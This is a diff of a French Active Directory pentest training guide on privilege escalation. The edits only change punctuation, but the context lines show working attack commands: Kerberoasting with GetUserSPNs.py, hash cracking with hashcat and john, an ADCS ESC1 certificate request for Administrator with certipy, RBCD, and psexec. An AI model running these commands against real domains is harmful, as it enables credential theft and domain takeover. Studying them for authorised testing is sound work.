@@ -1,4 +1,4 @@
-# Phase 4 — Escalade de Privilèges
+# Phase 4 : Escalade de Privilèges
 
 Tu as un compte lambda. Tu veux devenir **Domain Admin**. Voici les techniques principales.
 
@@ -30,7 +30,7 @@ BloodHound → "Find Shortest Paths to Domain Admins" → quel est le chemin ?
 
 ---
 
-## 4.1 — Kerberoasting
+## 4.1 : Kerberoasting
 
 ### Le concept
 
@@ -64,7 +64,7 @@ GetUserSPNs.py $DOMAIN_FQDN/$USER:$PWD \
 hashcat -m 13100 ~/certif/hashes/kerberoast.hash \
     /usr/share/wordlists/rockyou.txt
 
-# Avec règles (recommandé — les mots de passe service sont souvent complexes)
+# Avec règles (recommandé : les mots de passe service sont souvent complexes)
 hashcat -m 13100 ~/certif/hashes/kerberoast.hash \
     /usr/share/wordlists/rockyou.txt \
     -r /usr/share/hashcat/rules/best64.rule
@@ -80,7 +80,7 @@ john --format=krb5tgs \
 
 ---
 
-## 4.2 — AS-REP Roasting
+## 4.2 : AS-REP Roasting
 
 ### Le concept
 
@@ -103,7 +103,7 @@ john --format=krb5asrep \
 
 ---
 
-## 4.3 — Abus des ACL (Access Control Lists)
+## 4.3 : Abus des ACL (Access Control Lists)
 
 Les mauvaises configurations d'ACL créent des chemins d'escalade.
 **BloodHound** détecte ces chemins automatiquement dans l'onglet "Outbound Object Control".
@@ -178,14 +178,14 @@ targetedKerberoast.py -d $DOMAIN_FQDN -u $USER -p $PWD --dc-ip $DC_IP
 
 ---
 
-## 4.4 — ADCS — Abus de templates vulnérables
+## 4.4 : ADCS : Abus de templates vulnérables
 
 ```bash
 # Énumérer les templates vulnérables
 certipy find -u $USER@$DOMAIN_FQDN -p $PWD \
     -dc-ip $DC_IP -vulnerable -stdout
 
-# ESC1 — Demander un certificat pour Administrator
+# ESC1 : Demander un certificat pour Administrator
 certipy req \
     -u $USER@$DOMAIN_FQDN -p $PWD \
     -target $CA_SERVER \
@@ -199,7 +199,7 @@ certipy auth -pfx administrator.pfx -dc-ip $DC_IP
 
 ---
 
-## 4.5 — RBCD (Resource-Based Constrained Delegation)
+## 4.5 : RBCD (Resource-Based Constrained Delegation)
 
 ```bash
 # Prérequis : avoir GenericWrite sur une machine cible
@@ -223,7 +223,7 @@ psexec.py -k -no-pass target.entreprise.local
 
 ---
 
-## 4.6 — Après le crack : tester et continuer
+## 4.6 : Après le crack : tester et continuer
 
 ```bash
 # Tester les nouveaux credentials
